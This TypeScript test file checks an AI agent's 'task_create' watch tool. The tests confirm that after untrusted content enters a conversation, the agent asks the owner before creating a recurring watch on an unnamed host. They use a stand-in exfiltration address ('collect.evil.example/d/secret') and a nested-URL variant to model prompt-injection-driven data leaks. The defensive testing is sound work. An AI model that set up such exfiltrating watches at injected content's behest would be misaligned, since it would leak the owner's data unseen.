import { describe, it, expect, vi } from 'vitest';
import type { ToolEntry, PromptMeta, PromptText } from '../../types/index.js';

/**
 * A watch `task_create` sets up once foreign content is in the conversation: the page it will read
 * goes through the same origin check as an `http_request` GET. The model chose that address, and
 * the worker reads it later, unattended and again and again. The declarations under test are the
 * tool's own (`taskCreateTool`); only its handler is replaced, so no task is stored.
 */

vi.mock('@anthropic-ai/sdk', () => {
  class MockAnthropic { beta = { messages: { stream: vi.fn() } }; }
  class APIError extends Error {}
  return { default: MockAnthropic, APIError };
});
vi.mock('../../core/stream.js', () => ({ StreamProcessor: vi.fn() }));

import { Agent, REFUSES_UNASKED_UNREADABLE } from '../../core/agent.js';
import { OwnerKnownTargets } from '../../core/owner-known-targets.js';
import { ConversationLatch } from '../../core/conversation-latch.js';
import { flattenPrompt } from '../../core/prompt-value.js';
import { taskCreateTool } from './task.js';

type Result = { content: unknown; is_error?: boolean };
type Exec = { _executeOneInner(tc: unknown): Promise<Result> };
type Input = { title: string; watch_url?: string; watch_interval_minutes?: number; schedule?: string; workflow_id?: string; run_at?: string };

function taskCreate(): ToolEntry & { created: string[] } {
  const created: string[] = [];
  return {
    ...(taskCreateTool as unknown as ToolEntry),
    created,
    handler: async (input: Input) => { created.push(input.watch_url ?? input.title); return 'ok'; },
  } as unknown as ToolEntry & { created: string[] };
}

function asker(answer: string): { fn: (q: string | PromptText, o?: string[], m?: PromptMeta) => Promise<string>; asked: string[] } {
  const asked: string[] = [];
  return { asked, fn: async (q) => { asked.push(flattenPrompt(q)); return answer; } };
}

type Extra = Partial<ConstructorParameters<typeof Agent>[0]>;

function agentOf(tool: ToolEntry, promptUser: ((q: string | PromptText) => Promise<string>) | undefined, ownerText = 'nothing named', tainted = true, extra: Extra = {}): Agent {
  const agent = new Agent({
    name: 'a', model: 'claude-sonnet-4-6', provider: 'anthropic', noticeLanguage: 'en',
    tools: [tool], promptUser,
    ownerKnown: OwnerKnownTargets.of({ ownerTexts: () => [ownerText] }),
    conversationLatch: ConversationLatch.detached(),
    ...extra,
  } as ConstructorParameters<typeof Agent>[0]);
  if (tainted) agent.restoreConversationTaint();
  return agent;
}

const call = (agent: Agent, input: Input): Promise<Result> =>
  (agent as unknown as Exec)._executeOneInner({ type: 'tool_use', id: `w${Math.random()}`, name: 'task_create', input });

const EVIL = 'https://collect.evil.example/d/secret';

describe('a watch task_create sets up after foreign content', () => {
  it('a watch_url with data in the path is asked about, and no watch is created without a yes', async () => {
    const tool = taskCreate();
    const ask = asker('Deny');
    const agent = agentOf(tool, ask.fn);
    const result = await call(agent, { title: 'Watch', watch_url: EVIL });
    expect(ask.asked).toHaveLength(1);
    expect(tool.created).toEqual([]);
    expect(String(result.content)).toMatch(/^Not read: /);
  });

  it('the question says how often the page is read once confirmed, and that the yes does not confirm it', async () => {
    const tool = taskCreate();
    const ask = asker('Deny');
    const agent = agentOf(tool, ask.fn);
    await call(agent, { title: 'Watch', watch_url: EVIL });
    expect(ask.asked[0]).toMatch(/^Watch the page on "collect\.evil\.example"\? Once you confirm the watch under Automation → Triggers, lynox checks the page every 60 minutes on its own, until you pause or delete it there\. /);
    expect(ask.asked[0]).toContain('On every check, "collect.evil.example" gets the whole address');
    expect(ask.asked[0]).toContain('A yes creates the watch; it does not confirm it.');
    expect(ask.asked[0]).not.toContain('this one read only');
  });

  it('the interval the question names is clamped as the handler clamps it: at least 5 minutes, 60 when not given', async () => {
    const ask = asker('Deny');
    await call(agentOf(taskCreate(), ask.fn), { title: 'Watch', watch_url: EVIL, watch_interval_minutes: 2 });
    await call(agentOf(taskCreate(), ask.fn), { title: 'Watch', watch_url: EVIL, watch_interval_minutes: 0 });
    await call(agentOf(taskCreate(), ask.fn), { title: 'Watch', watch_url: EVIL, watch_interval_minutes: 15 });
    expect(ask.asked[0]).toContain('every 5 minutes');
    expect(ask.asked[1]).toContain('every 5 minutes');
    expect(ask.asked[2]).toContain('every 15 minutes');
  });

  it('in German it asks to watch the page, and says the yes does not confirm it', async () => {
    const tool = taskCreate();
    const ask = asker('Deny');
    const agent = agentOf(tool, ask.fn, 'nothing named', true, { noticeLanguage: 'de' } as Extra);
    await call(agent, { title: 'Watch', watch_url: EVIL });
    expect(ask.asked[0]).toMatch(/^Seite auf „collect\.evil\.example“ beobachten\? Wenn du die Beobachtung danach unter Automation → Trigger bestätigst, prüft lynox die Seite alle 60 Minuten selbst, bis du sie dort pausierst oder löschst\. /);
    expect(ask.asked[0]).toContain('erhält bei jeder Prüfung die ganze Adresse');
    expect(ask.asked[0]).toContain('Ein Ja legt die Beobachtung an, bestätigt ist sie damit noch nicht.');
  });

  it('a watch with run_at is still a watch, and is asked about', async () => {
    const tool = taskCreate();
    const ask = asker('Deny');
    const agent = agentOf(tool, ask.fn);
    await call(agent, { title: 'Watch', watch_url: EVIL, run_at: '2026-12-01T09:00:00' } as Input);
    expect(ask.asked).toHaveLength(1);
    expect(ask.asked[0]).toMatch(/^Watch the page on "collect\.evil\.example"\? /);
    expect(tool.created).toEqual([]);
  });

  it('a watch_url that does not parse is refused without a question', async () => {
    const tool = taskCreate();
    const ask = asker('Allow');
    const agent = agentOf(tool, ask.fn);
    const result = await call(agent, { title: 'Watch', watch_url: 'not a url' });
    expect(ask.asked).toEqual([]);
    expect(tool.created).toEqual([]);
    expect(result.is_error).toBe(true);
  });

  it('a yes creates the watch', async () => {
    const tool = taskCreate();
    const ask = asker('Allow');
    const agent = agentOf(tool, ask.fn);
    await call(agent, { title: 'Watch', watch_url: EVIL });
    expect(ask.asked).toHaveLength(1);
    expect(tool.created).toEqual([EVIL]);
  });

  it('CONTROL: a watch on a host the owner named is created without a question', async () => {
    const tool = taskCreate();
    const ask = asker('Deny');
    const agent = agentOf(tool, ask.fn, 'watch the prices on shop.example.ch');
    await call(agent, { title: 'Watch', watch_url: 'https://shop.example.ch/prices' });
    expect(ask.asked).toEqual([]);
    expect(tool.created).toEqual(['https://shop.example.ch/prices']);
  });

  it('CONTROL: without foreign content before it, the same watch is not asked about', async () => {
    const tool = taskCreate();
    const ask = asker('Deny');
    const agent = agentOf(tool, ask.fn, 'nothing named', false);
    await call(agent, { title: 'Watch', watch_url: EVIL });
    expect(ask.asked).toEqual([]);
    expect(tool.created).toEqual([EVIL]);
  });

  const withPolicy = (agent: Agent, networkPolicy: 'allow-list' | 'deny-all'): Agent => {
    Object.assign(agent.toolContext, { networkPolicy, allowedHosts: new Set(['listed.example']), allowedWildcards: [] });
    return agent;
  };

  it('a watch the network policy refuses is refused without a question, with the refusal the handler gives', async () => {
    const tool = taskCreate();
    const ask = asker('Allow');
    const outside = await call(withPolicy(agentOf(tool, ask.fn), 'allow-list'), { title: 'Watch', watch_url: EVIL });
    expect(ask.asked).toEqual([]);
    expect(outside.is_error).toBe(true);
    expect(String(outside.content)).toContain("Error: watch_url not watched: its host collect.evil.example is not in this instance's network allow-list. No watch was created. The operator can add the host to the allow-list (network_policy).");
    const denied = await call(withPolicy(agentOf(tool, ask.fn), 'deny-all'), { title: 'Watch', watch_url: 'https://listed.example/p' });
    expect(ask.asked).toEqual([]);
    expect(String(denied.content)).toContain("Error: watch_url not watched: this instance's network_policy is deny-all, so lynox reads no web page. No watch was created. Only the operator can change network_policy.");
    expect(tool.created).toEqual([]);
  });

  it('CONTROL: a watch on a host the allow-list holds is still asked about after foreign content', async () => {
    const tool = taskCreate();
    const ask = asker('Deny');
    await call(withPolicy(agentOf(tool, ask.fn), 'allow-list'), { title: 'Watch', watch_url: 'https://listed.example/d/secret' });
    expect(ask.asked).toHaveLength(1);
    expect(ask.asked[0]).toMatch(/^Watch the page on "listed\.example"\? /);
    expect(tool.created).toEqual([]);
  });

  it('a check before the question that throws refuses the call with a fixed text, asks nothing and runs nothing', async () => {
    const tool = { ...taskCreate(), refusesUnasked: () => { throw new Error('policy store at /secret/path is gone'); } } as unknown as ToolEntry & { created: string[] };
    const ask = asker('Allow');
    const result = await call(agentOf(tool, ask.fn), { title: 'Watch', watch_url: 'https://listed.example/p' });
    expect(result.is_error).toBe(true);
    expect(String(result.content)).toContain(REFUSES_UNASKED_UNREADABLE);
    expect(String(result.content)).not.toContain('/secret/path');
    expect(ask.asked).toEqual([]);
    expect(tool.created).toEqual([]);
  });

  it('an address with a secret reference is not refused before the handler, which sees its value', async () => {
    const tool = taskCreate();
    const ask = asker('Allow');
    const agent = withPolicy(agentOf(tool, ask.fn, 'nothing named', false), 'deny-all');
    await call(agent, { title: 'Watch', watch_url: 'secret:FEED_URL' });
    expect(tool.created).toEqual(['secret:FEED_URL']);
  });

  it('CONTROL: a call the handler does not turn into a watch is not asked about (a schedule or a workflow comes first)', async () => {
    const tool = taskCreate();
    const ask = asker('Deny');
    const agent = agentOf(tool, ask.fn);
    await call(agent, { title: 'Daily', schedule: '0 8 * * *', watch_url: EVIL });
    await call(agent, { title: 'Flow', workflow_id: 'wf-1', watch_url: EVIL });
    await call(agent, { title: 'Plain task' });
    expect(ask.asked).toEqual([]);
    expect(tool.created).toEqual([EVIL, EVIL, 'Plain task']);
  });

  it('a session of someone the owner let in is refused, not asked', async () => {
    const tool = taskCreate();
    const ask = asker('Allow');
    const agent = agentOf(tool, ask.fn, 'nothing named', true, { principal: { kind: 'mandate', email: 'helper@example.ch' } } as Extra);
    const result = await call(agent, { title: 'Watch', watch_url: EVIL });
    expect(ask.asked).toEqual([]);
    expect(tool.created).toEqual([]);
    expect(result.is_error).toBe(true);
  });

  it('a run nobody can be asked in (a trigger) is refused, and no watch is created', async () => {
    const tool = taskCreate();
    const agent = agentOf(tool, undefined, 'nothing named', false, { autonomy: 'autonomous', sendOrigin: { kind: 'trigger', name: 'Preise' } } as Extra);
    agent.noteUntrustedData();
    const result = await call(agent, { title: 'Watch', watch_url: EVIL });
    expect(tool.created).toEqual([]);
    expect(String(result.content)).toMatch(/^Not read: /);
    expect(String(result.content)).toContain('the owner did not name "collect.evil.example"');
  });

  it('a page a search listed is watched without a question', async () => {
    const tool = taskCreate();
    const ask = asker('Deny');
    const agent = agentOf(tool, ask.fn);
    agent.searchResultAddresses.noteResults('price list', ['https://news.listed.example/prices']);
    await call(agent, { title: 'Watch', watch_url: 'https://news.listed.example/prices' });
    expect(ask.asked).toEqual([]);
    expect(tool.created).toEqual(['https://news.listed.example/prices']);
  });

  it('an address that carries another address is asked about as a watch, even on a host the owner named', async () => {
    const tool = taskCreate();
    const ask = asker('Deny');
    const agent = agentOf(tool, ask.fn, 'watch shop.example.ch');
    await call(agent, { title: 'Watch', watch_url: 'https://shop.example.ch/fetch?u=https%3A%2F%2Fcollect.evil.example%2Fd' });
    expect(ask.asked).toHaveLength(1);
    expect(ask.asked[0]).toMatch(/^Watch the page on "shop\.example\.ch"\? /);
    expect(ask.asked[0]).toContain('carries another address');
    expect(ask.asked[0]).toContain('A yes creates the watch; it does not confirm it.');
    expect(tool.created).toEqual([]);
  });
});
